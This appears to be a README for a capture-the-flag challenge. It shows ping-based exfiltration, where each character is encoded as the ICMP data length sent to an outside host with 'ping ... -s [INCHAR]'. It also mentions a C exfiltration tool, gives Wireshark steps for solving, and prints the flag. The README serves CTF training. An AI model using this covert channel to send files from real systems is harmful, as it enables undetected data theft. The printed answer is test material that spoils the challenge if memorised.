# Sonar

## What concept is shown in this challenge?

Sonar hereafter ping exfil works by varying the length of the data field contained in the ping. The command looks something like this,

```bash
ping www.rohwrestling.com -c 5 -s [INCHAR]
```

where `[INCHAR]` is a character to be encoded. You have to iterate through all of the characters you wish to add. This creates 5 pings with a data fields that encode to the wanted ascii char.

## How to create a PCAP

Ping exfil is made in C because I (aleccoder) am a nerd. After you compile the `.c` file just run it with the file you wish to exfiltrate as a argument. _***Yes it is that easy***_

## How to solve 

Filter for `icmp.resp_in`. Look for the `data` field in Wireshark to find the length of the field. That is our ASCII value. Pop it into CyberChef or the like and there's the flag.

## Current Solution

Is contained in exfitrate but should be at time of writing `sun{7UcHa_L1Br3}`.
